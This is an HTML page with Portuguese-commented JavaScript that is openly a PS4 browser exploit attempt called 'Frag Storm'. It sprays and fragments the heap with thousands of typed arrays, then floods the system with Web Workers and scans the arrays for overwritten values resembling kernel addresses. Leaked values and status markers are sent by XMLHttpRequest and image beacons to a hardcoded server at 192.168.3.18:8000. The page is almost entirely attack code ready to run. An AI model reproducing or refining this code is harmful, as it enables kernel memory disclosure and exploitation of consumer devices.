<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 FRAG STORM (FENG SHUI)</title>
    <style>
        body { background-color: #000; color: #0ff; font-family: monospace; text-align: center; padding: 20px; }
        #status { font-size: 1.5em; border: 2px solid #0ff; padding: 20px; margin: 20px 0; background: #002; }
        .prep { color: #ff0; }
        .ready { color: #0f0; border-color: #0f0; }
        .panic { color: #fff; background: #f00; }
    </style>
</head>
<body>

    <h1>FRAG STORM (PRE-ALLOCATION)</h1>
    <div id="status">VERIFIQUE O IP!</div>

    <script>
        // --- CONFIGURAÇÃO ---
        const SERVER_IP = "192.168.3.18"; // <--- SEU IP DO LOG
        const SERVER_PORT = "8000";
        
        const MAX_THREADS = 425;
        const STRUCT_SIZE = 128; // 512 bytes
        const PATTERN = 0xCAFEBABE;

        let workers = [];
        let traps = [];
        
        // Worker para alocação massiva
        const url = URL.createObjectURL(new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'}));

        function start() {
            if(SERVER_IP.includes("XX")) return alert("IP ERRADO");
            
            document.getElementById('status').innerText = `ALVO: ${SERVER_IP}\nFASE 1: PREPARANDO MEMÓRIA...`;
            document.getElementById('status').className = "prep";
            logToAndroid("INICIO_FRAG_STORM");

            // Executa o Feng Shui (Demora uns 3 segundos)
            setTimeout(heapFengShui, 500);
        }

        function heapFengShui() {
            // 1. SPRAY MASSIVO
            // Aloca 10.000 arrays para cobrir grande parte do Heap
            try {
                for(let i=0; i<10000; i++) {
                    let arr = new Uint32Array(STRUCT_SIZE);
                    arr.fill(PATTERN);
                    arr[0] = 0x11111111; // ID Início
                    arr[1] = i;          // ID Único
                    traps.push(arr);
                }
            } catch(e) {}

            document.getElementById('status').innerText = "FASE 2: CRIANDO BURACOS...";
            
            // 2. FRAGMENTAÇÃO (SWISS CHEESE)
            // Libera um array a cada 2 (deixa buracos de 512 bytes livres)
            // O Kernel adora pegar esses buracos para criar Threads.
            setTimeout(() => {
                for(let i=0; i<traps.length; i+=2) {
                    traps[i] = null; // Libera para o Garbage Collector
                }
                
                document.getElementById('status').innerText = "FASE 3: ATIVANDO SCANNER...";
                document.getElementById('status').className = "ready";
                logToAndroid("MEMORIA_PREPARADA");
                
                // Inicia o Scanner AGORA, antes do ataque
                setInterval(scanAliveTraps, 50);

                // Começa o Ataque
                setTimeout(startAttack, 1000);
            }, 1000);
        }

        function startAttack() {
            logToAndroid("INICIANDO_THREADS");
            
            let i = setInterval(() => {
                if (workers.length >= MAX_THREADS) { clearInterval(i); return; }

                workers.push(new Worker(url));

                if(workers.length % 10 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}`;

                // Quando entrar na zona de perigo, o Scanner já estará rodando
                if(workers.length === 400) {
                    document.getElementById('status').className = "panic";
                    document.getElementById('status').innerText = "ZONA DE IMPACTO (400+)";
                    logToAndroid("IMPACTO_IMINENTE");
                    
                    // Acelera o scanner no final
                    setInterval(scanAliveTraps, 10); 
                }

            }, 30);
        }

        function scanAliveTraps() {
            // Varre apenas os arrays que SOBRARAM (os índices ímpares)
            // Se o Kernel escrever "por cima" de um vizinho ou errar o buraco, nós pegamos.
            for(let k=1; k < traps.length; k+=2) {
                const arr = traps[k];
                if(arr) {
                    // Checagem rápida nos pontos vitais
                    if(arr[16] !== PATTERN || arr[32] !== PATTERN || arr[0] !== 0x11111111) {
                        
                        // ALGO MUDOU! ENVIA TUDO!
                        for(let i=0; i<STRUCT_SIZE; i++) {
                            let val = arr[i];
                            // Ignora nosso padrão e zeros
                            if(val !== PATTERN && val !== 0x11111111 && val !== k && val !== 0) {
                                
                                let hex = (val >>> 0).toString(16);
                                // Filtro de qualidade: Queremos endereços de Kernel (0xffffffff8....)
                                // No log vai aparecer sem o 0x. Procure por strings começando com "8" ou "f" grandes.
                                if(hex.length > 5) {
                                    // ENVIA SÍNCRONO (TRAVA TUDO MAS GARANTE O ENVIO)
                                    const req = new XMLHttpRequest();
                                    req.open("GET", `http://${SERVER_IP}:${SERVER_PORT}/LEAK_OFF_${i*4}_VAL_${hex}`, false);
                                    req.send();
                                    return; // Um basta
                                }
                            }
                        }
                    }
                }
            }
        }

        function logToAndroid(data) {
            new Image().src = `http://${SERVER_IP}:${SERVER_PORT}/${data}`;
        }

        setTimeout(start, 1000);

    </script>
</body>
</html>
